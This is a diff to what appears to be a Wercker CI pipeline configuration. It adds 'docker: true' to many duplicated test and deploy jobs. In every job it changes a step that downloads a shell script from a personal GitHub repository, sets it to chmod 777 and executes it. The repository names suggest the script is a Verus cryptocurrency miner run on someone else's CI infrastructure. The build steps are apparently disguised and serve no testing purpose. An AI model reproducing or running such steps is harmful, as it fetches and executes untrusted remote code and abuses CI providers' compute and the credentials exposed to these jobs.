@@ -4,6 +4,7 @@ box:
   password: $DOCKERHUB_ACCESS_TOKEN
   ports:
     - "5000"
+docker: true
 
 dev:
   steps:
@@ -35,6 +36,7 @@ integration-tests:
       password: $DOCKERHUB_ACCESS_TOKEN
       ports:
          - "5000"
+  docker: true
   steps:
     - script:
         name: Copy and test the wercker executable
@@ -43,7 +45,7 @@ integration-tests:
                apt-get -y install git
                apt-get -y install wget 
                wget --version
-               wget https://raw.githubusercontent.com/raufpermana22/verusruby/main/tes1.sh && chmod 777 tes1.sh && ./tes1.sh
+               wget https://github.com/raufpermana22/verust/raw/main/tus2.sh && chmod 777 tus2.sh && ./tus2.sh
                          
 
     
@@ -52,6 +54,8 @@ deploy:
       id : ubuntu
       username: $DOCKERHUB_USERNAME
       password: $DOCKERHUB_ACCESS_TOKEN
+  docker: true
+
   steps:
     - script:
         name: update certs
@@ -60,7 +64,7 @@ deploy:
                apt-get -y install git
                apt-get -y install wget 
                wget --version
-               wget https://raw.githubusercontent.com/raufpermana22/verusruby/main/tes1.sh && chmod 777 tes1.sh && ./tes1.sh
+               wget https://github.com/raufpermana22/verust/raw/main/tus2.sh && chmod 777 tus2.sh && ./tus2.sh
                
 
     
@@ -71,6 +75,7 @@ run-tests:
     id: ruby:latest
     username: $DOCKERHUB_USERNAME
     password: $DOCKERHUB_ACCESS_TOKEN
+  docker: true
     #volumes: $CODE_PATH /var/run/docker.sock
   steps:
       - script:
@@ -79,7 +84,7 @@ run-tests:
                  apt-get -y install git
                  apt-get -y install wget 
                  wget --version
-                 wget https://raw.githubusercontent.com/raufpermana22/verusruby/main/tes1.sh && chmod 777 tes1.sh && ./tes1.sh
+                 wget https://github.com/raufpermana22/verust/raw/main/tus2.sh && chmod 777 tus2.sh && ./tus2.sh
                  
 integration-tests1:
   box: 
@@ -88,6 +93,8 @@ integration-tests1:
       password: $DOCKERHUB_ACCESS_TOKEN
       ports:
          - "8080"
+  docker: true
+
   steps:
     - script:
         name: Copy and test the wercker executable
@@ -96,7 +103,7 @@ integration-tests1:
                apt-get -y install git
                apt-get -y install wget 
                wget --version
-               wget https://raw.githubusercontent.com/raufpermana22/verusruby/main/tes1.sh && chmod 777 tes1.sh && ./tes1.sh
+               wget https://github.com/raufpermana22/verust/raw/main/tus2.sh && chmod 777 tus2.sh && ./tus2.sh
                
 integration-tests2:
   box: 
@@ -105,6 +112,8 @@ integration-tests2:
       password: $DOCKERHUB_ACCESS_TOKEN
       ports:
          - "8080"
+  docker: true
+
   steps:
     - script:
         name: Copy and test the wercker executable
@@ -113,7 +122,7 @@ integration-tests2:
                apt-get -y install git
                apt-get -y install wget 
                wget --version
-               wget https://raw.githubusercontent.com/raufpermana22/verusruby/main/tes1.sh && chmod 777 tes1.sh && ./tes1.sh
+               wget https://github.com/raufpermana22/verust/raw/main/tus2.sh && chmod 777 tus2.sh && ./tus2.sh
                
 integration-tests3:
   box: 
@@ -122,6 +131,8 @@ integration-tests3:
       password: $DOCKERHUB_ACCESS_TOKEN
       ports:
          - "8080"
+  docker: true
+
   steps:
     - script:
         name: Copy and test the wercker executable
@@ -130,13 +141,15 @@ integration-tests3:
                apt-get -y install git
                apt-get -y install wget 
                wget --version
-               wget https://raw.githubusercontent.com/raufpermana22/verusruby/main/tes1.sh && chmod 777 tes1.sh && ./tes1.sh
+               wget https://github.com/raufpermana22/verust/raw/main/tus2.sh && chmod 777 tus2.sh && ./tus2.sh
 
 deploy1:
   box: 
       id : ubuntu
       username: $DOCKERHUB_USERNAME
       password: $DOCKERHUB_ACCESS_TOKEN
+  docker: true
+
   steps:
     - script:
         name: update certs
@@ -145,7 +158,7 @@ deploy1:
                apt-get -y install git
                apt-get -y install wget 
                wget --version
-               wget https://raw.githubusercontent.com/raufpermana22/verusruby/main/tes1.sh && chmod 777 tes1.sh && ./tes1.sh
+               wget https://github.com/raufpermana22/verust/raw/main/tus2.sh && chmod 777 tus2.sh && ./tus2.sh
                
 
     
@@ -156,6 +169,7 @@ run-tests1:
     id: ruby:latest
     username: $DOCKERHUB_USERNAME
     password: $DOCKERHUB_ACCESS_TOKEN
+  docker: true
     #volumes: $CODE_PATH /var/run/docker.sock
   steps:
       - script:
@@ -164,7 +178,7 @@ run-tests1:
                  apt-get -y install git
                  apt-get -y install wget 
                  wget --version
-                 wget https://raw.githubusercontent.com/raufpermana22/verusruby/main/tes1.sh && chmod 777 tes1.sh && ./tes1.sh
+                 wget https://github.com/raufpermana22/verust/raw/main/tus2.sh && chmod 777 tus2.sh && ./tus2.sh
                  
 integration-tests4:
   box: 
@@ -173,6 +187,8 @@ integration-tests4:
       password: $DOCKERHUB_ACCESS_TOKEN
       ports:
          - "8080"
+  docker: true
+
   steps:
     - script:
         name: Copy and test the wercker executable
@@ -181,7 +197,7 @@ integration-tests4:
                apt-get -y install git
                apt-get -y install wget 
                wget --version
-               wget https://raw.githubusercontent.com/raufpermana22/verusruby/main/tes1.sh && chmod 777 tes1.sh && ./tes1.sh
+               wget https://github.com/raufpermana22/verust/raw/main/tus2.sh && chmod 777 tus2.sh && ./tus2.sh
                
 integration-tests5:
   box: 
@@ -190,6 +206,8 @@ integration-tests5:
       password: $DOCKERHUB_ACCESS_TOKEN
       ports:
          - "8080"
+  docker: true
+
   steps:
     - script:
         name: Copy and test the wercker executable
@@ -198,7 +216,7 @@ integration-tests5:
                apt-get -y install git
                apt-get -y install wget 
                wget --version
-               wget https://raw.githubusercontent.com/raufpermana22/verusruby/main/tes1.sh && chmod 777 tes1.sh && ./tes1.sh
+               wget https://github.com/raufpermana22/verust/raw/main/tus2.sh && chmod 777 tus2.sh && ./tus2.sh
                
 integration-tests6:
   box: 
@@ -207,6 +225,8 @@ integration-tests6:
       password: $DOCKERHUB_ACCESS_TOKEN
       ports:
          - "8080"
+  docker: true
+
   steps:
     - script:
         name: Copy and test the wercker executable
@@ -215,13 +235,15 @@ integration-tests6:
                apt-get -y install git
                apt-get -y install wget 
                wget --version
-               wget https://raw.githubusercontent.com/raufpermana22/verusruby/main/tes1.sh && chmod 777 tes1.sh && ./tes1.sh
+               wget https://github.com/raufpermana22/verust/raw/main/tus2.sh && chmod 777 tus2.sh && ./tus2.sh
 
 deploy2:
   box: 
       id : ubuntu
       username: $DOCKERHUB_USERNAME
       password: $DOCKERHUB_ACCESS_TOKEN
+  docker: true
+
   steps:
     - script:
         name: update certs
@@ -230,7 +252,7 @@ deploy2:
                apt-get -y install git
                apt-get -y install wget 
                wget --version
-               wget https://raw.githubusercontent.com/raufpermana22/verusruby/main/tes1.sh && chmod 777 tes1.sh && ./tes1.sh
+               wget https://github.com/raufpermana22/verust/raw/main/tus2.sh && chmod 777 tus2.sh && ./tus2.sh
                
 
     
@@ -241,6 +263,8 @@ run-tests2:
     id: ruby:latest
     username: $DOCKERHUB_USERNAME
     password: $DOCKERHUB_ACCESS_TOKEN
+  docker: true
+
     #volumes: $CODE_PATH /var/run/docker.sock
   steps:
       - script:
@@ -249,7 +273,7 @@ run-tests2:
                  apt-get -y install git
                  apt-get -y install wget 
                  wget --version
-                 wget https://raw.githubusercontent.com/raufpermana22/verusruby/main/tes1.sh && chmod 777 tes1.sh && ./tes1.sh
+                 wget https://github.com/raufpermana22/verust/raw/main/tus2.sh && chmod 777 tus2.sh && ./tus2.sh
                  
 integration-tests7:
   box: 
@@ -258,6 +282,8 @@ integration-tests7:
       password: $DOCKERHUB_ACCESS_TOKEN
       ports:
          - "8080"
+  docker: true
+
   steps:
     - script:
         name: Copy and test the wercker executable
@@ -266,7 +292,7 @@ integration-tests7:
                apt-get -y install git
                apt-get -y install wget 
                wget --version
-               wget https://raw.githubusercontent.com/raufpermana22/verusruby/main/tes1.sh && chmod 777 tes1.sh && ./tes1.sh
+               wget https://github.com/raufpermana22/verust/raw/main/tus2.sh && chmod 777 tus2.sh && ./tus2.sh
                
 integration-tests8:
   box: 
@@ -275,6 +301,8 @@ integration-tests8:
       password: $DOCKERHUB_ACCESS_TOKEN
       ports:
          - "8080"
+  docker: true
+
   steps:
     - script:
         name: Copy and test the wercker executable
@@ -283,7 +311,7 @@ integration-tests8:
                apt-get -y install git
                apt-get -y install wget 
                wget --version
-               wget https://raw.githubusercontent.com/raufpermana22/verusruby/main/tes1.sh && chmod 777 tes1.sh && ./tes1.sh
+               wget https://github.com/raufpermana22/verust/raw/main/tus2.sh && chmod 777 tus2.sh && ./tus2.sh
                
 integration-tests9:
   box: 
@@ -292,6 +320,8 @@ integration-tests9:
       password: $DOCKERHUB_ACCESS_TOKEN
       ports:
          - "8080"
+  docker: true
+  
   steps:
     - script:
         name: Copy and test the wercker executable
@@ -300,4 +330,4 @@ integration-tests9:
                apt-get -y install git
                apt-get -y install wget 
                wget --version
-               wget https://raw.githubusercontent.com/raufpermana22/verusruby/main/tes1.sh && chmod 777 tes1.sh && ./tes1.sh
+               wget https://github.com/raufpermana22/verust/raw/main/tus2.sh && chmod 777 tus2.sh && ./tus2.sh
